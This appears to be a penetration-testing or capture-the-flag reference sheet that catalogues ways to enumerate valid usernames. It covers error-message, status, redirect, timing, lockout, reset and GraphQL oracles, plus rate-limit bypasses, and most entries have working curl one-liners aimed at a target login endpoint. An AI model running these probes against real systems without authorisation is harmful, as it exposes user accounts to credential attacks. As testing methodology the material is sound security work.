# Attack shapes (deep) — every primitive, fully worked

## Shape: the honest-error oracle

`POST /login` returns `"No such user"` vs `"Wrong password"`. The naive
shape — one request per candidate, the text is the whole oracle.

```bash
for u in admin service backup flag; do
  printf '%-10s ' "$u"; curl -s -X POST -d "user=$u&pass=x" "$BASE/login" | grep -oE '(No such|Wrong)[^<]*'
done
# "No such" -> fake ; "Wrong password" -> real
```

## Shape: the code/class oracle

Identical message, different `error_code`/CSS-class/`data-`/hidden
input/comment/JSON-field:

```bash
diff <(mask<g) <(mask<b)   # the survivor is the oracle
# <div class="err-NOUSER"> vs <div class="err-BADPASS">
# {"error_code":1001} vs {"error_code":1002}
# data-reason="user" vs data-reason="pass"
```

## Shape: the redirect-parameter oracle

`302 /login?error=user` vs `?error=pass`, `?e=1` vs `?e=2`:

```bash
curl -s -D - -o /dev/null -X POST -d "user=$U&pass=x" "$BASE/login" | grep -i '^location'
```

## Shape: the status oracle

`404` vs `401`, `200` vs `302`, `422` vs `401`:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d "user=$U&pass=x" "$BASE/login"
```

## Shape: the timing oracle

`verify()` runs only for real users — a 50-300ms KDF gap:

```bash
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$KNOWN&pass=x" "$BASE/login"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE&pass=x"  "$BASE/login"
done | awk '{a[$1]+=$2;c[$1]++}END{print "g",a["g"]/c["g"],"b",a["b"]/c["b"]}'
```

## Shape: the variance oracle

A time-equalized app's fixed dummy-hash has lower stdev than a per-user
real hash — `stdev(good)` vs `stdev(bad)`.

## Shape: the side-artifact oracle

A `Set-Cookie`, an `attempts_remaining`/`emails_sent` field, a send that
fires only for real, a `X-Auth-Reason` header:

```bash
curl -sv -X POST -d "user=$U&pass=x" "$BASE/login" 2>&1 | grep -iE 'set-cookie|x-|emails|sent'
```

## Shape: the direct-exists oracle

`GET /check-username?u=`/`/available?u=`/`/api/users/{name}` —
`{"available":false}` / `200`/`404`. One request per name.

## Shape: the register-taken oracle

`POST /register` → `"username taken"`/`409`. Built to reveal.

## Shape: the reset-send oracle

`POST /forgot-password` → the send queues only for a real row —
`{"emails_queued":1}` vs `0`, or the send itself.

## Shape: the lockout oracle

`423 "locked"` on a real name at N, `"invalid"` on a fake forever.

## Shape: the GraphQL resolver oracle

`userByEmail`/`checkUser`/`userExists` `null`/`{id}`/`false`/`true`;
a `login` mutation's `"USER_NOT_FOUND"` vs `"INVALID_CREDENTIALS"`.

## Shape: the throttle findings

- absent — a 15-req burst, no 429/lock/delay
- threshold — `429`/`423` at N
- bypassed — XFF/session/endpoint/method/param/case reset

Each shape resolves to one channel's measurement — the shape is the
named instance; `channels.md`/`per-channel-deep.md` is the protocol.
